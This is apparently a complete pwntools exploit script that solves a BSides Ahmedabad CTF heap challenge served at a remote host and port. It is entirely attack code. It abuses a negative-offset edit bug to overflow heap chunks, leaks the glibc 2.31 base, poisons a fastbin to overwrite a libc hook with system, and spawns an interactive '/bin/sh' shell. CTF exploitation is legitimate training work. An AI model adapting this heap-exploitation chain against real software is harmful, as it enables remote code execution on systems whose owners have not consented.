from pwn import *
from sys import *

elf = ELF("./chall")
p = process("./chall")
libc = ELF("./libc-2.31.so")

HOST = "pwn.bsidesahmedabad.in"
PORT = 9003

cmd = """
b*EditNote+204
b*main+296
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

def add(idx, size, content):
	p.sendlineafter("Choice: ", '1')
	p.sendlineafter(": ", str(idx))
	p.sendlineafter(": ", str(size))
	p.sendlineafter(": ", content)

def edit(idx, offset, count, content):
	p.sendlineafter("Choice: ", '2')
	p.sendlineafter(": ", str(idx))
	p.sendlineafter(": ", str(offset))
	p.sendlineafter(": ", str(count))
	p.sendlineafter(": ", content)

def view(idx):
	p.sendlineafter("Choice: ", '3')
	p.sendlineafter(": ", str(idx))

def delete(idx):
	p.sendlineafter("Choice: ", '4')
	p.sendlineafter(": ", str(idx))



for i in range(7):
	add(0, 0x60, str(i)*8)
	delete(0)

log.info("LEAK LIBC")
add(0, 0x30, b'0'*8)
add(1, 0x30 ,b'1'*8)
add(2, 0x440, b"A"*0x28 + p64(0x51))
add(3, 0x30, b'3'*8)
edit(0, 0x30, -0x80000001, b'A'*8+p64(0x491))
delete(1)
add(1, 0x30, b'0'*8)

view(2)
p.recvuntil(b'Content: ')
leak = u64(p.recvn(6)+b'\x00'*2)
libc.address = leak - libc.sym['__malloc_hook'] & ~0xfff
print(hex(libc.address))

#clear notes index
delete(0)
delete(1)
delete(3)

#Prepare fastbin attack
add(0, 0x60, b'0'*8)
add(1, 0x60, b'1'*8)
add(3, 0x60, b'3'*8)
delete(3)
delete(1)
edit(0,0x60, -0x80000001, b'X'*8+p64(0x71)+p64(libc.address+0x1ed560+165))
	
add(1,0x60,b'/bin/sh\x00')
add(3,0x60,b'\x00'*0x23+p64(0xdeadbeef))
edit(3,0x60-1-4,  -0x80000001, b'\x00'*0x14b8+p64(libc.sym['system']))
#shell
delete(1)

p.interactive()